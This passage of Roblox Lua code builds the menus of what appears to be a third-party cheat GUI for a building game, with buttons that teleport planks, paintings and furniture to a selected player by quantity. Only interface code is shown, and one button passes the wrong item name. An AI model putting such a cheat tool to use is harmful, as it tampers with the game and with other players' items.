FillFrost.BorderColor3 = Color3.new(0.6, 0, 0)
FillFrost.Position = UDim2.new(0, 3, 0, 372)
FillFrost.Size = UDim2.new(0, 137, 0, 20)
FillFrost.Image = "rbxassetid://2712667804"
FillFrost.MouseButton1Down:connect(function()
Type.Text = "Frost Planks"
SingleItemTpQty("Frost", PlyrSelz.Text, qty.Text)
end)

CountItems17 = Instance.new("TextLabel")
CountItems17.Parent = MoveWood
CountItems17.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems17.BackgroundTransparency = 0.6
CountItems17.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems17.Position = UDim2.new(0, 147, 0, 372)
CountItems17.Size = UDim2.new(0, 25, 0, 20)
CountItems17.Font = Enum.Font.Fantasy
CountItems17.Text = "0"
CountItems17.TextColor3 = Color3.new(0, 1, 0)
CountItems17.TextSize = 14

FillFir = Instance.new("ImageButton")
FillFir.Name = "FillFir"
FillFir.Parent = MoveWood
FillFir.BackgroundColor3 = Color3.new(1, 1, 1)
FillFir.BackgroundTransparency = 1
FillFir.BorderColor3 = Color3.new(0.6, 0, 0)
FillFir.Position = UDim2.new(0, 3, 0, 395)
FillFir.Size = UDim2.new(0, 137, 0, 20)
FillFir.Image = "rbxassetid://2712591183"
FillFir.MouseButton1Down:connect(function()
Type.Text = "Fir Planks"
SingleItemTpQty("Frost", PlyrSelz.Text, qty.Text)
end)

CountItems18 = Instance.new("TextLabel")
CountItems18.Parent = MoveWood
CountItems18.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems18.BackgroundTransparency = 0.6
CountItems18.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems18.Position = UDim2.new(0, 147, 0, 395)
CountItems18.Size = UDim2.new(0, 25, 0, 20)
CountItems18.Font = Enum.Font.Fantasy
CountItems18.Text = "0"
CountItems18.TextColor3 = Color3.new(0, 1, 0)
CountItems18.TextSize = 14




MovePaint = Instance.new("ScrollingFrame")
MovePaint.Name = "MovePaint"
MovePaint.Parent = MenuFrame
MovePaint.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MovePaint.BackgroundTransparency = 0.5
MovePaint.Position =  UDim2.new(0, 179, 0, 0)
MovePaint.BorderColor3 = Color3.new(0, 0, 0)
MovePaint.Size = UDim2.new(0, 195, 0, 450)
MovePaint.CanvasPosition = Vector2.new(0,0)
MovePaint.CanvasSize = UDim2.new(0, 0, 0, 1055)
MovePaint.Visible = false

PaintMove = Instance.new("TextButton")
PaintMove.Name = "PaintMove"
PaintMove.Parent = MoveFrame
PaintMove.BackgroundColor3 = Color3.new(0, 0, 0)
PaintMove.BorderColor3 = Color3.new(1, 0, 0)
PaintMove.BackgroundTransparency = 0.6
PaintMove.Position =  UDim2.new(0, 3, 0, 73)
PaintMove.Size = UDim2.new(0, 164, 0, 20)
PaintMove.Font = Enum.Font.Fantasy
PaintMove.Text = "Sort Paintings"
PaintMove.TextColor3 = Color3.new(1, 1, 1)
PaintMove.TextSize = 14
PaintMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

Painting1 = Instance.new("ImageButton")
Painting1.Name = "Painting1"
Painting1.Parent = MovePaint
Painting1.BackgroundColor3 = Color3.new(1, 1, 1)
Painting1.BackgroundTransparency = 1
Painting1.BorderColor3 = Color3.new(0.6, 0, 0)
Painting1.Position = UDim2.new(0, 5, 0, 5)
Painting1.Size = UDim2.new(0, 100, 0, 100)
Painting1.Image = "rbxassetid://3704199708"
Painting1.MouseButton1Down:connect(function()
Type.Text = "Unknown"
SingleItemTpQty("Painting1", PlyrSelz.Text, qty.Text)
end)

CountItems19 = Instance.new("TextLabel")
CountItems19.Parent = MovePaint
CountItems19.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems19.BackgroundTransparency = 0.6
CountItems19.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems19.Position = UDim2.new(0, 110, 0, 55)
CountItems19.Size = UDim2.new(0, 25, 0, 20)
CountItems19.Font = Enum.Font.SourceSans
CountItems19.Text = "0"
CountItems19.TextColor3 = Color3.new(0, 1, 0)
CountItems19.TextSize = 25

Painting2 = Instance.new("ImageButton")
Painting2.Name = "Painting2"
Painting2.Parent = MovePaint
Painting2.BackgroundColor3 = Color3.new(1, 1, 1)
Painting2.BackgroundTransparency = 1
Painting2.BorderColor3 = Color3.new(0.6, 0, 0)
Painting2.Position = UDim2.new(0, 5, 0, 105)
Painting2.Size = UDim2.new(0, 100, 0, 100)
Painting2.Image = "rbxassetid://3704200080"
Painting2.MouseButton1Down:connect(function()
Type.Text = "Disturbed Painting"
SingleItemTpQty("Painting2", PlyrSelz.Text, qty.Text)
end)

CountItems20 = Instance.new("TextLabel")
CountItems20.Parent = MovePaint
CountItems20.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems20.BackgroundTransparency = 0.6
CountItems20.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems20.Position = UDim2.new(0, 110, 0, 160)
CountItems20.Size = UDim2.new(0, 25, 0, 20)
CountItems20.Font = Enum.Font.SourceSans
CountItems20.Text = "0"
CountItems20.TextColor3 = Color3.new(0, 1, 0)
CountItems20.TextSize = 25

Painting3 = Instance.new("ImageButton")
Painting3.Name = "Painting3"
Painting3.Parent = MovePaint
Painting3.BackgroundColor3 = Color3.new(1, 1, 1)
Painting3.BackgroundTransparency = 1
Painting3.BorderColor3 = Color3.new(0.6, 0, 0)
Painting3.Position = UDim2.new(0, 5, 0, 210)
Painting3.Size = UDim2.new(0, 100, 0, 100)
Painting3.Image = "rbxassetid://3704200464"
Painting3.MouseButton1Down:connect(function()
Type.Text = "Outdoor Watercolor"
SingleItemTpQty("Painting3", PlyrSelz.Text, qty.Text)
end)

CountItems21 = Instance.new("TextLabel")
CountItems21.Parent = MovePaint
CountItems21.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems21.BackgroundTransparency = 0.6
CountItems21.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems21.Position = UDim2.new(0, 110, 0, 265)
CountItems21.Size = UDim2.new(0, 25, 0, 20)
CountItems21.Font = Enum.Font.SourceSans
CountItems21.Text = "0"
CountItems21.TextColor3 = Color3.new(0, 1, 0)
CountItems21.TextSize = 25

Painting4 = Instance.new("ImageButton")
Painting4.Name = "Painting4"
Painting4.Parent = MovePaint
Painting4.BackgroundColor3 = Color3.new(1, 1, 1)
Painting4.BackgroundTransparency = 1
Painting4.BorderColor3 = Color3.new(0.6, 0, 0)
Painting4.Position = UDim2.new(0, 5, 0, 315)
Painting4.Size = UDim2.new(0, 100, 0, 100)
Painting4.Image = "rbxassetid://4101048532"
Painting4.MouseButton1Down:connect(function()
Type.Text = "Painting4"
SingleItemTpQty("Painting4", PlyrSelz.Text, qty.Text)
end)

CountItems22 = Instance.new("TextLabel")
CountItems22.Parent = MovePaint
CountItems22.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems22.BackgroundTransparency = 0.6
CountItems22.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems22.Position = UDim2.new(0, 110, 0, 370)
CountItems22.Size = UDim2.new(0, 25, 0, 20)
CountItems22.Font = Enum.Font.SourceSans
CountItems22.Text = "0"
CountItems22.TextColor3 = Color3.new(0, 1, 0)
CountItems22.TextSize = 25

Painting5 = Instance.new("ImageButton")
Painting5.Name = "Painting5"
Painting5.Parent = MovePaint
Painting5.BackgroundColor3 = Color3.new(1, 1, 1)
Painting5.BackgroundTransparency = 1
Painting5.BorderColor3 = Color3.new(0.6, 0, 0)
Painting5.Position = UDim2.new(0, 5, 0, 420)
Painting5.Size = UDim2.new(0, 100, 0, 100)
Painting5.Image = "rbxassetid://4101047770"
Painting5.MouseButton1Down:connect(function()
Type.Text = "Full Context"
SingleItemTpQty("Painting5", PlyrSelz.Text, qty.Text)
end)

CountItems23 = Instance.new("TextLabel")
CountItems23.Parent = MovePaint
CountItems23.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems23.BackgroundTransparency = 0.6
CountItems23.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems23.Position = UDim2.new(0, 110, 0, 475)
CountItems23.Size = UDim2.new(0, 25, 0, 20)
CountItems23.Font = Enum.Font.SourceSans
CountItems23.Text = "0"
CountItems23.TextColor3 = Color3.new(0, 1, 0)
CountItems23.TextSize = 25

Painting6 = Instance.new("ImageButton")
Painting6.Name = "Painting6"
Painting6.Parent = MovePaint
Painting6.BackgroundColor3 = Color3.new(1, 1, 1)
Painting6.BackgroundTransparency = 1
Painting6.BorderColor3 = Color3.new(0.6, 0, 0)
Painting6.Position = UDim2.new(0, 5, 0, 525)
Painting6.Size = UDim2.new(0, 100, 0, 100)
Painting6.Image = "rbxassetid://3837073428"
Painting6.MouseButton1Down:connect(function()
Type.Text = "Gloomy Seascape"
SingleItemTpQty("Painting6", PlyrSelz.Text, qty.Text)
end)

CountItems24 = Instance.new("TextLabel")
CountItems24.Parent = MovePaint
CountItems24.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems24.BackgroundTransparency = 0.6
CountItems24.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems24.Position = UDim2.new(0, 110, 0, 580)
CountItems24.Size = UDim2.new(0, 25, 0, 20)
CountItems24.Font = Enum.Font.SourceSans
CountItems24.Text = "0"
CountItems24.TextColor3 = Color3.new(0, 1, 0)
CountItems24.TextSize = 25

Painting7 = Instance.new("ImageButton")
Painting7.Name = "Painting7"
Painting7.Parent = MovePaint
Painting7.BackgroundColor3 = Color3.new(1, 1, 1)
Painting7.BackgroundTransparency = 1
Painting7.BorderColor3 = Color3.new(0.6, 0, 0)
Painting7.Position = UDim2.new(0, 5, 0, 630)
Painting7.Size = UDim2.new(0, 100, 0, 100)
Painting7.Image = "rbxassetid://3837074043"
Painting7.MouseButton1Down:connect(function()
Type.Text = "Arctic Light"
SingleItemTpQty("Painting7", PlyrSelz.Text, qty.Text)
end)

CountItems25 = Instance.new("TextLabel")
CountItems25.Parent = MovePaint
CountItems25.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems25.BackgroundTransparency = 0.6
CountItems25.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems25.Position = UDim2.new(0, 110, 0, 685)
CountItems25.Size = UDim2.new(0, 25, 0, 20)
CountItems25.Font = Enum.Font.SourceSans
CountItems25.Text = "0"
CountItems25.TextColor3 = Color3.new(0, 1, 0)
CountItems25.TextSize = 25

Painting8 = Instance.new("ImageButton")
Painting8.Name = "Painting8"
Painting8.Parent = MovePaint
Painting8.BackgroundColor3 = Color3.new(1, 1, 1)
Painting8.BackgroundTransparency = 1
Painting8.BorderColor3 = Color3.new(0.6, 0, 0)
Painting8.Position = UDim2.new(0, 5, 0, 735)
Painting8.Size = UDim2.new(0, 100, 0, 100)
Painting8.Image = "rbxassetid://3837074708"
Painting8.MouseButton1Down:connect(function()
Type.Text = "Pineapple"
SingleItemTpQty("Painting8", PlyrSelz.Text, qty.Text)
end)

CountItems26 = Instance.new("TextLabel")
CountItems26.Parent = MovePaint
CountItems26.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems26.BackgroundTransparency = 0.6
CountItems26.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems26.Position = UDim2.new(0, 110, 0, 790)
CountItems26.Size = UDim2.new(0, 25, 0, 20)
CountItems26.Font = Enum.Font.SourceSans
CountItems26.Text = "0"
CountItems26.TextColor3 = Color3.new(0, 1, 0)
CountItems26.TextSize = 25

Painting9 = Instance.new("ImageButton")
Painting9.Name = "Painting9"
Painting9.Parent = MovePaint
Painting9.BackgroundColor3 = Color3.new(1, 1, 1)
Painting9.BackgroundTransparency = 1
Painting9.BorderColor3 = Color3.new(0.6, 0, 0)
Painting9.Position = UDim2.new(0, 5, 0, 840)
Painting9.Size = UDim2.new(0, 100, 0, 100)
Painting9.Image = "rbxassetid://3837075520"
Painting9.MouseButton1Down:connect(function()
Type.Text = "The Lonely Giraffe"
SingleItemTpQty("Painting9", PlyrSelz.Text, qty.Text)
end)

CountItems27 = Instance.new("TextLabel")
CountItems27.Parent = MovePaint
CountItems27.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems27.BackgroundTransparency = 0.6
CountItems27.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems27.Position = UDim2.new(0, 110, 0, 895)
CountItems27.Size = UDim2.new(0, 25, 0, 20)
CountItems27.Font = Enum.Font.SourceSans
CountItems27.Text = "0"
CountItems27.TextColor3 = Color3.new(0, 1, 0)
CountItems27.TextSize = 25

Painting10 = Instance.new("ImageButton")
Painting10.Name = "Painting10"
Painting10.Parent = MovePaint
Painting10.BackgroundColor3 = Color3.new(1, 1, 1)
Painting10.BackgroundTransparency = 1
Painting10.BorderColor3 = Color3.new(0.6, 0, 0)
Painting10.Position = UDim2.new(0, 5, 0, 945)
Painting10.Size = UDim2.new(0, 100, 0, 100)
Painting10.Image = "rbxassetid://4481885278"
Painting10.MouseButton1Down:connect(function()
Type.Text = "Burnt"
SingleItemTpQty("Painting10", PlyrSelz.Text, qty.Text)
end)

CountItems28 = Instance.new("TextLabel")
CountItems28.Parent = MovePaint
CountItems28.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems28.BackgroundTransparency = 0.6
CountItems28.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems28.Position = UDim2.new(0, 110, 0, 1000)
CountItems28.Size = UDim2.new(0, 25, 0, 20)
CountItems28.Font = Enum.Font.SourceSans
CountItems28.Text = "0"
CountItems28.TextColor3 = Color3.new(0, 1, 0)
CountItems28.TextSize = 25

MoveFurn = Instance.new("ScrollingFrame")
MoveFurn.Name = "MoveFurn"
MoveFurn.Parent = MenuFrame
MoveFurn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveFurn.BackgroundTransparency = 0.5
MoveFurn.Position =  UDim2.new(0, 179, 0, 0)
MoveFurn.BorderColor3 = Color3.new(0, 0, 0)
MoveFurn.Size = UDim2.new(0, 195, 0, 450)
MoveFurn.CanvasPosition = Vector2.new(0,0)
MoveFurn.CanvasSize = UDim2.new(0, 0, 0, 1370)
MoveFurn.Visible = false

FurnMove = Instance.new("TextButton")
FurnMove.Name = "FurnMove"
FurnMove.Parent = MoveFrame
FurnMove.BackgroundColor3 = Color3.new(0, 0, 0)
FurnMove.BorderColor3 = Color3.new(1, 0, 0)
FurnMove.BackgroundTransparency = 0.6
FurnMove.Position =  UDim2.new(0, 3, 0, 96)
FurnMove.Size = UDim2.new(0, 164, 0, 20)
FurnMove.Font = Enum.Font.Fantasy
FurnMove.Text = "Sort Furniture"
FurnMove.TextColor3 = Color3.new(1, 1, 1)
FurnMove.TextSize = 14
FurnMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

FloorLamp1 = Instance.new("ImageButton")
FloorLamp1.Name = "FloorLamp1"
FloorLamp1.Parent = MoveFurn
FloorLamp1.BackgroundColor3 = Color3.new(1, 1, 1)
FloorLamp1.BackgroundTransparency = 1
FloorLamp1.BorderColor3 = Color3.new(0.6, 0, 0)
FloorLamp1.Position = UDim2.new(0, 5, 0, 5)
FloorLamp1.Size = UDim2.new(0, 100, 0, 100)
FloorLamp1.Image = "rbxassetid://3704076866"
FloorLamp1.MouseButton1Down:connect(function()
Type.Text = "Floor Lamp Big"
SingleItemTpQty("FloorLamp1", PlyrSelz.Text, qty.Text)
end)

CountItems29 = Instance.new("TextLabel")
CountItems29.Parent = MoveFurn
CountItems29.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems29.BackgroundTransparency = 0.6
CountItems29.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems29.Position = UDim2.new(0, 110, 0, 55)
CountItems29.Size = UDim2.new(0, 25, 0, 20)
CountItems29.Font = Enum.Font.SourceSans
CountItems29.Text = "0"
CountItems29.TextColor3 = Color3.new(0, 1, 0)
CountItems29.TextSize = 25

WallLight1 = Instance.new("ImageButton")
WallLight1.Name = "WallLight1"
WallLight1.Parent = MoveFurn
WallLight1.BackgroundColor3 = Color3.new(1, 1, 1)
WallLight1.BackgroundTransparency = 1
WallLight1.BorderColor3 = Color3.new(0.6, 0, 0)
WallLight1.Position = UDim2.new(0, 5, 0, 105)
WallLight1.Size = UDim2.new(0, 100, 0, 100)
WallLight1.Image = "rbxassetid://3704081860"
WallLight1.MouseButton1Down:connect(function()
Type.Text = "WallLight"
SingleItemTpQty("WallLight1", PlyrSelz.Text, qty.Text)
end)

CountItems30 = Instance.new("TextLabel")
CountItems30.Parent = MoveFurn
CountItems30.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems30.BackgroundTransparency = 0.6
CountItems30.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems30.Position = UDim2.new(0, 110, 0, 160)
CountItems30.Size = UDim2.new(0, 25, 0, 20)
CountItems30.Font = Enum.Font.SourceSans
CountItems30.Text = "0"
CountItems30.TextColor3 = Color3.new(0, 1, 0)
CountItems30.TextSize = 25

WallLight2 = Instance.new("ImageButton")
WallLight2.Name = "WallLight2"
WallLight2.Parent = MoveFurn
WallLight2.BackgroundColor3 = Color3.new(1, 1, 1)
WallLight2.BackgroundTransparency = 1
WallLight2.BorderColor3 = Color3.new(0.6, 0, 0)
WallLight2.Position = UDim2.new(0, 5, 0, 210)
WallLight2.Size = UDim2.new(0, 100, 0, 100)
WallLight2.Image = "rbxassetid://3704186371"
WallLight2.MouseButton1Down:connect(function()
Type.Text = "Flood Light"
SingleItemTpQty("WallLight2", PlyrSelz.Text, qty.Text)
end)

CountItems31 = Instance.new("TextLabel")
CountItems31.Parent = MoveFurn
CountItems31.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems31.BackgroundTransparency = 0.6
CountItems31.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems31.Position = UDim2.new(0, 110, 0, 265)
CountItems31.Size = UDim2.new(0, 25, 0, 20)
CountItems31.Font = Enum.Font.SourceSans
CountItems31.Text = "0"
CountItems31.TextColor3 = Color3.new(0, 1, 0)
CountItems31.TextSize = 25

Seat_Armchair = Instance.new("ImageButton")
Seat_Armchair.Name = "Seat_Armchair"
Seat_Armchair.Parent = MoveFurn
Seat_Armchair.BackgroundColor3 = Color3.new(1, 1, 1)
Seat_Armchair.BackgroundTransparency = 1
Seat_Armchair.BorderColor3 = Color3.new(0.6, 0, 0)
Seat_Armchair.Position = UDim2.new(0, 5, 0, 315)
Seat_Armchair.Size = UDim2.new(0, 100, 0, 100)
Seat_Armchair.Image = "rbxassetid://3704077769"
Seat_Armchair.MouseButton1Down:connect(function()
Type.Text = "Seat Armchair"
SingleItemTpQty("Seat_Armchair", PlyrSelz.Text, qty.Text)
end)

CountItems32 = Instance.new("TextLabel")
CountItems32.Parent = MoveFurn
CountItems32.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems32.BackgroundTransparency = 0.6
CountItems32.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems32.Position = UDim2.new(0, 110, 0, 370)
CountItems32.Size = UDim2.new(0, 25, 0, 20)
CountItems32.Font = Enum.Font.SourceSans
CountItems32.Text = "0"
CountItems32.TextColor3 = Color3.new(0, 1, 0)
CountItems32.TextSize = 25

Seat_Couch = Instance.new("ImageButton")
Seat_Couch.Name = "Seat_Couch"
Seat_Couch.Parent = MoveFurn
Seat_Couch.BackgroundColor3 = Color3.new(1, 1, 1)
Seat_Couch.BackgroundTransparency = 1
Seat_Couch.BorderColor3 = Color3.new(0.6, 0, 0)
Seat_Couch.Position = UDim2.new(0, 5, 0, 420)
Seat_Couch.Size = UDim2.new(0, 100, 0, 100)
Seat_Couch.Image = "rbxassetid://3704078093"
Seat_Couch.MouseButton1Down:connect(function()
Type.Text = "Couch"
SingleItemTpQty("Seat_Couch", PlyrSelz.Text, qty.Text)
end)

CountItems33 = Instance.new("TextLabel")
CountItems33.Parent = MoveFurn
CountItems33.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems33.BackgroundTransparency = 0.6
CountItems33.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems33.Position = UDim2.new(0, 110, 0, 475)
CountItems33.Size = UDim2.new(0, 25, 0, 20)
CountItems33.Font = Enum.Font.SourceSans
CountItems33.Text = "0"
CountItems33.TextColor3 = Color3.new(0, 1, 0)
CountItems33.TextSize = 25

Seat_Loveseat = Instance.new("ImageButton")
Seat_Loveseat.Name = "Seat_Loveseat"
Seat_Loveseat.Parent = MoveFurn
Seat_Loveseat.BackgroundColor3 = Color3.new(1, 1, 1)
Seat_Loveseat.BackgroundTransparency = 1
Seat_Loveseat.BorderColor3 = Color3.new(0.6, 0, 0)
Seat_Loveseat.Position = UDim2.new(0, 5, 0, 525)
Seat_Loveseat.Size = UDim2.new(0, 100, 0, 100)
Seat_Loveseat.Image = "rbxassetid://3704078402"
Seat_Loveseat.MouseButton1Down:connect(function()
Type.Text = "Loveseat"
SingleItemTpQty("Seat_Loveseat", PlyrSelz.Text, qty.Text)
end)

CountItems34 = Instance.new("TextLabel")
CountItems34.Parent = MoveFurn
CountItems34.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems34.BackgroundTransparency = 0.6
CountItems34.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems34.Position = UDim2.new(0, 110, 0, 580)
CountItems34.Size = UDim2.new(0, 25, 0, 20)
CountItems34.Font = Enum.Font.SourceSans
CountItems34.Text = "0"
CountItems34.TextColor3 = Color3.new(0, 1, 0)
CountItems34.TextSize = 25

Bed1 = Instance.new("ImageButton")
Bed1.Name = "Bed1"
Bed1.Parent = MoveFurn
Bed1.BackgroundColor3 = Color3.new(1, 1, 1)
Bed1.BackgroundTransparency = 1
Bed1.BorderColor3 = Color3.new(0.6, 0, 0)
Bed1.Position = UDim2.new(0, 5, 0, 630)
Bed1.Size = UDim2.new(0, 100, 0, 100)
Bed1.Image = "rbxassetid://4218292007"
Bed1.MouseButton1Down:connect(function()
Type.Text = "Single Bed"
SingleItemTpQty("Bed1", PlyrSelz.Text, qty.Text)
end)

CountItems35 = Instance.new("TextLabel")
CountItems35.Parent = MoveFurn
CountItems35.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems35.BackgroundTransparency = 0.6
CountItems35.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems35.Position = UDim2.new(0, 110, 0, 685)
CountItems35.Size = UDim2.new(0, 25, 0, 20)
CountItems35.Font = Enum.Font.SourceSans
CountItems35.Text = "0"
CountItems35.TextColor3 = Color3.new(0, 1, 0)
CountItems35.TextSize = 25

Bed2 = Instance.new("ImageButton")
Bed2.Name = "Bed2"
Bed2.Parent = MoveFurn
Bed2.BackgroundColor3 = Color3.new(1, 1, 1)
Bed2.BackgroundTransparency = 1
Bed2.BorderColor3 = Color3.new(0.6, 0, 0)
Bed2.Position = UDim2.new(0, 5, 0, 735)
Bed2.Size = UDim2.new(0, 100, 0, 100)
Bed2.Image = "rbxassetid://3704076312"
Bed2.MouseButton1Down:connect(function()
Type.Text = "Big Bed"
SingleItemTpQty("Bed2", PlyrSelz.Text, qty.Text)
end)

CountItems36 = Instance.new("TextLabel")
CountItems36.Parent = MoveFurn
CountItems36.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems36.BackgroundTransparency = 0.6
CountItems36.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems36.Position = UDim2.new(0, 110, 0, 790)
CountItems36.Size = UDim2.new(0, 25, 0, 20)
CountItems36.Font = Enum.Font.SourceSans
CountItems36.Text = "0"
CountItems36.TextColor3 = Color3.new(0, 1, 0)
CountItems36.TextSize = 25

Refridgerator = Instance.new("ImageButton")
Refridgerator.Name = "Refridgerator"
Refridgerator.Parent = MoveFurn
Refridgerator.BackgroundColor3 = Color3.new(1, 1, 1)
Refridgerator.BackgroundTransparency = 1
Refridgerator.BorderColor3 = Color3.new(0.6, 0, 0)
Refridgerator.Position = UDim2.new(0, 5, 0, 840)
Refridgerator.Size = UDim2.new(0, 100, 0, 100)
Refridgerator.Image = "rbxassetid://3704077460"
Refridgerator.MouseButton1Down:connect(function()
Type.Text = "Refridgerator"
SingleItemTpQty("Refridgerator", PlyrSelz.Text, qty.Text)
end)

CountItems37 = Instance.new("TextLabel")
CountItems37.Parent = MoveFurn
CountItems37.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems37.BackgroundTransparency = 0.6
CountItems37.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems37.Position = UDim2.new(0, 110, 0, 895)
CountItems37.Size = UDim2.new(0, 25, 0, 20)
CountItems37.Font = Enum.Font.SourceSans
CountItems37.Text = "0"
CountItems37.TextColor3 = Color3.new(0, 1, 0)
CountItems37.TextSize = 25

Stove = Instance.new("ImageButton")
Stove.Name = "Stove"
Stove.Parent = MoveFurn
Stove.BackgroundColor3 = Color3.new(1, 1, 1)
Stove.BackgroundTransparency = 1
Stove.BorderColor3 = Color3.new(0.6, 0, 0)
Stove.Position = UDim2.new(0, 5, 0, 945)
Stove.Size = UDim2.new(0, 100, 0, 100)
Stove.Image = "rbxassetid://3704078679"
Stove.MouseButton1Down:connect(function()
Type.Text = "Stove"
SingleItemTpQty("Stove", PlyrSelz.Text, qty.Text)
end)

CountItems38 = Instance.new("TextLabel")
CountItems38.Parent = MoveFurn
CountItems38.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems38.BackgroundTransparency = 0.6
CountItems38.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems38.Position = UDim2.new(0, 110, 0, 1000)
CountItems38.Size = UDim2.new(0, 25, 0, 20)
CountItems38.Font = Enum.Font.SourceSans
CountItems38.Text = "0"
CountItems38.TextColor3 = Color3.new(0, 1, 0)
CountItems38.TextSize = 25

Dishwasher = Instance.new("ImageButton")
Dishwasher.Name = "Dishwasher"
Dishwasher.Parent = MoveFurn
Dishwasher.BackgroundColor3 = Color3.new(1, 1, 1)
Dishwasher.BackgroundTransparency = 1
Dishwasher.BorderColor3 = Color3.new(0.6, 0, 0)
Dishwasher.Position = UDim2.new(0, 5, 0, 1050)
Dishwasher.Size = UDim2.new(0, 100, 0, 100)
Dishwasher.Image = "rbxassetid://3704076585"
Dishwasher.MouseButton1Down:connect(function()
Type.Text = "Dishwasher"
SingleItemTpQty("Dishwasher", PlyrSelz.Text, qty.Text)
end)

CountItems39 = Instance.new("TextLabel")
CountItems39.Parent = MoveFurn
CountItems39.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems39.BackgroundTransparency = 0.6
CountItems39.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems39.Position = UDim2.new(0, 110, 0, 1105)
CountItems39.Size = UDim2.new(0, 25, 0, 20)
CountItems39.Font = Enum.Font.SourceSans
CountItems39.Text = "0"
CountItems39.TextColor3 = Color3.new(0, 1, 0)
CountItems39.TextSize = 25

Toilet = Instance.new("ImageButton")
Toilet.Name = "Toilet"
Toilet.Parent = MoveFurn
Toilet.BackgroundColor3 = Color3.new(1, 1, 1)
Toilet.BackgroundTransparency = 1
Toilet.BorderColor3 = Color3.new(0.6, 0, 0)
Toilet.Position = UDim2.new(0, 5, 0, 1155)
Toilet.Size = UDim2.new(0, 100, 0, 100)
Toilet.Image = "rbxassetid://3704078968"
Toilet.MouseButton1Down:connect(function()
Type.Text = "Toilet"
SingleItemTpQty("Toilet", PlyrSelz.Text, qty.Text)
end)

CountItems40 = Instance.new("TextLabel")
CountItems40.Parent = MoveFurn
CountItems40.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems40.BackgroundTransparency = 0.6
CountItems40.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems40.Position = UDim2.new(0, 110, 0, 1210)
CountItems40.Size = UDim2.new(0, 25, 0, 20)
CountItems40.Font = Enum.Font.SourceSans
CountItems40.Text = "0"
CountItems40.TextColor3 = Color3.new(0, 1, 0)
CountItems40.TextSize = 25

Lamp1 = Instance.new("ImageButton")
Lamp1.Name = "Lamp1"
Lamp1.Parent = MoveFurn
Lamp1.BackgroundColor3 = Color3.new(1, 1, 1)
Lamp1.BackgroundTransparency = 1
Lamp1.BorderColor3 = Color3.new(0.6, 0, 0)
Lamp1.Position = UDim2.new(0, 5, 0, 1260)
Lamp1.Size = UDim2.new(0, 100, 0, 100)
Lamp1.Image = "rbxassetid://3704077196"
Lamp1.MouseButton1Down:connect(function()
Type.Text = "Lamp"
SingleItemTpQty("Lamp1", PlyrSelz.Text, qty.Text)
end)

CountItems41 = Instance.new("TextLabel")
CountItems41.Parent = MoveFurn
CountItems41.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems41.BackgroundTransparency = 0.6
CountItems41.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems41.Position = UDim2.new(0, 110, 0, 1315)
CountItems41.Size = UDim2.new(0, 25, 0, 20)
CountItems41.Font = Enum.Font.SourceSans
CountItems41.Text = "0"
CountItems41.TextColor3 = Color3.new(0, 1, 0)
CountItems41.TextSize = 25

MoveConv = Instance.new("ScrollingFrame")
MoveConv.Name = "MoveConv"
MoveConv.Parent = MenuFrame
MoveConv.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveConv.BackgroundTransparency = 0.5
MoveConv.Position =  UDim2.new(0, 179, 0, 0)
MoveConv.BorderColor3 = Color3.new(0, 0, 0)
MoveConv.Size = UDim2.new(0, 195, 0, 450)
MoveConv.CanvasPosition = Vector2.new(0,0)
MoveConv.CanvasSize = UDim2.new(0, 0, 0, 1060)
MoveConv.Visible = false

ConvMove = Instance.new("TextButton")
ConvMove.Name = "ConvMove"
ConvMove.Parent = MoveFrame
ConvMove.BackgroundColor3 = Color3.new(0, 0, 0)
ConvMove.BorderColor3 = Color3.new(1, 0, 0)
ConvMove.BackgroundTransparency = 0.6
